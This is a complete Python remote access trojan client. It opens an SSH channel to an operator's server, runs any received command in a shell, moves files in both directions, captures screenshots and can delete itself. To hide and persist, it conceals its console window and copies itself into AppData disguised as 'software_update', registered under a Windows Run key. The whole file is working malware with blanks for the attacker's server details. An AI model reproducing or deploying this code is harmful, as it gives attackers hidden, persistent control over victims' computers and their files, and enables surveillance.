#!/usr/bin/env python3
import datetime
import socket
import os
import sys
import time
import subprocess
import shutil
import paramiko
import getpass
from pathlib import Path
from PIL import ImageGrab

# CONFIGURATION
IP = '' #your server ip
PORT = 2222 #port for your server
USERNAME = '' #your server namei
PASSWORD = '' #your server password

current_dir = Path(__file__).parent

def set_persistence():
    current_os = os.name
    if current_os == 'nt':
        try:
            import winreg

            if getattr(sys, 'frozen', False):
                exe_path = Path(sys.executable).resolve()
                path_name = 'software_update.exe'
            else:
                exe_path = Path(__file__).resolve()
                path_name = 'software_update.py'
            
            appdata_dir = Path(os.environ['APPDATA']) / 'SystemUpdates'

            appdata_dir.mkdir(exist_ok=True, parents=True)
            target_path = appdata_dir / path_name

            if exe_path != target_path:
                shutil.copyfile(exe_path, target_path)

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) # type: ignore

            winreg.SetValueEx(key, 'SaturnAdmin', 0, winreg.REG_SZ, str(target_path)) # type: ignore
            winreg.CloseKey(key) # type: ignore

        except Exception:
            pass

def stealth_mode():
    current_os = os.name
    if current_os == 'nt':
        import ctypes

        kernel32 = ctypes.WinDLL('kernel32') # type: ignore
        user32 = ctypes.WinDLL('user32') # type: ignore

        hWnd = kernel32.GetConsoleWindow()
        if hWnd != 0:
            user32.ShowWindow(hWnd, 0)

def execute_command(command):
    '''function to execute commands from server'''
    global current_dir
    try:
        cmd_output = subprocess.check_output(command, shell=True, cwd=str(current_dir), stderr=subprocess.STDOUT)
        if not cmd_output:
            cmd_output = 'Okay.\n'.encode('utf-8')
        decoded = cmd_output.decode('utf-8', errors='ignore').strip()
        return f'{decoded}\n'.encode('utf-8')
    except subprocess.CalledProcessError as e:
        err_output = e.output.decode('utf-8', errors='ignore').strip()
        return f'{err_output}\n'.encode('utf-8') if err_output else f'Command retured error code: {e.returncode}\n'.encode('utf-8')
    except Exception as e:
        return f'Execute error: {e}\n'.encode('utf-8')

def start_client():
    global current_dir
    stealth_mode()
    set_persistence()
    while True:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=IP, port=PORT, username=USERNAME, password=PASSWORD)

            transport = client.get_transport()
            assert transport is not None
            chan = transport.open_session()

            sys_info = f'{getpass.getuser()}@{socket.gethostname()}'
            chan.send(sys_info.encode('utf-8'))

            print('[+] Waiting for commands...')
            while True:
                chan.send(str(current_dir).encode('utf-8'))
                command = chan.recv(1024).decode('utf-8')

                if not command:
                    break

                command = command.strip()

                if command == 'keep_alive':
                    continue

                if command.lower() == 'exit':
                    chan.close()
                    client.close()
                    return

                if command.lower() == 'delete':
                    if getattr(sys, 'frozen', False):
                        exe_path = Path(sys.executable)
                    else:
                        exe_path = Path(__file__)

                    current_os = os.name
                    
                    if current_os == 'nt':
                        cmd_command = f'timeout /t 3 && del /f /q "{exe_path.resolve()}"'
                        CREATE_NO_WINDOW = 0x08000000
                        subprocess.Popen(cmd_command, shell=True, creationflags=CREATE_NO_WINDOW)
                    else:
                        bash_command = f'sleep 3 && rm -f "{exe_path}"'
                        subprocess.Popen(bash_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                    
                    chan.close()
                    client.close()
                    sys.exit(0)
                    return

                if command.startswith('cd'):
                    try:
                        path_arg = command[3:].strip().strip("'\"")
                        if not path_arg:
                            target_path = Path.home()
                        else:
                            target_path = Path(current_dir / path_arg).resolve()

                        if target_path.exists() and target_path.is_dir():
                            current_dir = target_path
                            cmd_result = b'\n'
                        else:
                            cmd_result = f'Error: The system cannot find path specified: {path_arg}\n'.encode('utf-8')
                    except Exception as e:
                        cmd_result = f'Error: {e}\n'.encode('utf-8')
                    
                    result_len = len(cmd_result)
                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
                    chan.sendall(cmd_result)
                    continue

                if len(command) == 2 and command[0].isalpha() and command[1] == ':':
                    disk = f'{command.strip().upper()}\\'

                    if Path(disk).exists():
                        target_path = Path(disk)
                        current_dir = target_path
                        cmd_result = b'\n'
                    else:
                        cmd_result = f'Error: The system cannot find disk specified: {disk}'.encode('utf-8')

                    result_len = len(cmd_result)
                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
                    chan.sendall(cmd_result)
                    continue

                if command.startswith('download'):
                    file_name = command[9:].strip().strip("'\"")
                    file_path = Path(current_dir / file_name).resolve()

                    if file_path.exists() and file_path.is_file():
                        try:
                            with open(file_path, 'rb') as file:
                                cmd_result = file.read()
                            result_len = len(cmd_result)
                            chan.sendall(f'{result_len}\n'.encode('utf-8'))
                            chan.sendall(cmd_result)
                        except Exception as e:
                            cmd_result = f'Error reading file: {e}\n'.encode('utf-8')
                            result_len = len(cmd_result)
                            chan.sendall(f'{result_len}\n'.encode('utf-8'))
                            chan.sendall(cmd_result)
                    else:
                        cmd_result = f'Error: File not found: {file_name}\n'.encode('utf-8')
                        result_len = len(cmd_result)
                        chan.sendall(f'{result_len}\n'.encode('utf-8'))
                        chan.sendall(cmd_result)
                    continue

                if command.startswith('upload'):
                    file_name = command[7:].strip().strip("'\"")
                    file_path = Path(current_dir / file_name).resolve()

                    try:
                        len_bytes = b''
                        while not len_bytes.endswith(b'\n'):
                            chunk = chan.recv(1)
                            if not chunk:
                                break
                            len_bytes += chunk
                        data_size = int(len_bytes.decode('utf-8').strip())

                        file_data = b''
                        while len(file_data) < data_size:
                            chunk = chan.recv(data_size - len(file_data))
                            if not chunk:
                                break
                            file_data += chunk

                        with open(file_path, 'wb') as file:
                            file.write(file_data)

                        cmd_result = f'File {file_name} uploaded successfully.\n'.encode('utf-8')
                    except Exception as e:
                        cmd_result = f'Upload error on client: {e}\n'.encode('utf-8')
                    result_len = len(cmd_result)
                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
                    chan.sendall(cmd_result)
                    continue

                if command == 'screenshot':
                    time_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    file_name = f'screenshot_{time_str}.png'
                    file_path = current_dir / file_name

                    screenshot = ImageGrab.grab()
                    screenshot.save(file_path)

                    cmd_result = f'Screenshot {file_name} successfully shot.\n'.encode('utf-8')
                    result_len = len(cmd_result)
                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
                    chan.sendall(cmd_result)
                    continue

                cmd_result = execute_command(command)
                result_len = len(cmd_result)
                chan.sendall(f'{result_len}\n'.encode('utf-8'))
                chan.sendall(cmd_result)
            chan.close()
        except Exception:
            print('[-] Connection failed. Reconecting in 10 seconds...')
            time.sleep(10)
        finally:
            client.close()

if __name__ == '__main__':
    start_client()
